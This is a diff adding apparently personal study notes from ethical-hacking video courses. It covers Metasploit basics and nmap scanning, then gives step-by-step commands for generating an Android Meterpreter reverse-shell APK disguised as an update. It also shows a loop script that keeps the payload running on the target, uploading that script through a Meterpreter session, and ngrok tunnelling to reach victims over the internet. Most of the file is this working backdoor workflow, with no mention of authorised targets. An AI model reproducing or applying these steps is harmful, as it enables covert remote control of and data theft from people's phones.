@@ -1,0 +1,161 @@
+CYBERSECURITY NOTES:
+
+Ethical Hacking Full Course - Learn Ethical Hacking in 10 Hours | Ethical Hacking Tutorial | Edureka
+
+CIA triad:
+ - Confidentiality
+ - Integrity
+ - Availability
+
+Metasploit:
+ 3 interfaces availablle for this-
+  - msfconsole
+  - Armitage (GUI)
+  - msfcli
+  
+  - to start the interace:
+  msfconsole
+  
+  - Use a particular exploit:
+  use exploit/exploit_path
+  
+  - Display options/target/payloads
+  show
+  
+  show info -> gives a brief description about the vulnerability
+  
+  metasploit modules are stored in: /usr/share/metasploit-framework/modules
+  
+  modules:
+   - auxiliary
+   - encoders
+   - exploits
+   - nops
+   - payloads
+   - post
+   
+   Payloads	: consist of singles, stagers & stages.
+   Auxiliary: consists of scanners, crawlers etc
+   Encoders	:
+   Nops		: a low-level machine language kind of thing, that allows us to overflow the buffer.
+   Post		: Has stuff that provides additional functionality AFTER we've gained access to the s/m.
+   
+   
+   https://www.youtube.com/watch?v=6SNHuWaLuhU&list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm&index=2
+   
+   
+   To perform port scans, using nmap:
+    - start the msfconsole.
+    - nmap -sT target IP address
+	- in case of firewall or something, use nmap -sS target IP
+	
+	To find out info about target that is using SSH, we can do:
+		search ssh_version
+		The above command will return the matching modules
+		
+		from the result, we can use the module: auxiliary/scanner/ssh/ssh_version
+		use auxiliary/scanner/ssh/ssh_version
+		
+		then, give command: options
+		this will display all the options this auxiliary module supports
+		
+		set the RHOSTS using the set command.
+		
+		set RHOSTS TARGET_IP
+		set THREADS 100
+		
+https://www.youtube.com/watch?v=CYB6Uta9VTI
+
+
+
+Using Msfvenom to generate payload that can be used to establish Meterpreter session:
+
+1. Generate payload:
+	sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=your_IP LPORT=your_port -o Desktop/update_persistence.apk
+	
+2. start up Metasploit console:
+	msfconsole
+
+3. Use the exploit for listen & establish session to target:
+	use exploit/multi/handler
+
+4. Set payload for the exploit:
+	set payload android/meterpreter/reverse_tcp 
+
+5. Set the LHOST & LPORT in the exploit:
+	set LHOST your_IP
+	set LPORT your_port
+	
+6. start the exploit:
+	exploit
+	
+	Install the apk to target & the session will be established (upon opening the application i'm guessing)
+	
+To autostart the MainActivity process in the target machine, we create a bash script that starts MainActivity process every 10 seconds. The bash script is as follows:
+
+#!/bin/sh
+while:
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+sleep 10
+done
+
+To put this bash script into the target machine, we can use the upload command in the meterpreter session:
+
+	1) Move into the sd card location:
+		cd /sdcard
+		
+	2) Upload the bash script using the upload command:
+		upload Desktop/autostart.sh
+		
+	3) Run the scipt:
+		nohup sh autostart.sh
+	
+	
+############################################################################################################################################################################################################
+
+Using ngrok to get meterpreter session over the internet: https://www.youtube.com/watch?v=z5Vc7cgakBk
+
+Installing ngrok:
+https://www.youtube.com/watch?v=HxqtAny8TnE
+
+Port forwarding using ngrok:
+	ngrok tcp port_number e.g 8080
+	
+Create payload using msfvenom:
+	sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=18695 -o Desktop/test.apk
+	
+Start postgresql db:
+	sudo service postgreqsl start
+
+Start msfconsole:
+	msfconsole
+
+Select exploit:
+	use exploit/multi/handler
+	
+set payload:
+	set payload android/meterpreter/reverse_tcp
+
+	show options
+	
+set LHOST to localhost:
+	set LHOST localhost
+	
+set LPORT:
+	set LPORT 8080 (or whichever port we forwarded)
+	
+and then....exploit! - this should start listening on the port and establish a session
+	
+	exploit
+
+
+	[NOTE: The apk sends "data" to the ngrok port, and this in turn forwards the connection to our system - since we forwarded our port to this at the beginning.]
+	
+############################################################################################################################################################################################################
+	Binding payload to an APK with Termux & a custom tool:
+	
+	https://www.youtube.com/watch?v=Xx-4H2KC-Pw
+	https://github.com/Cesar-Hack-Gray/Spade
+############################################################################################################################################################################################################
+	
+	BINDING PAYLOAD TO AN APK USING MEFVENOM: https://www.youtube.com/watch?v=gZe5xScUMNE
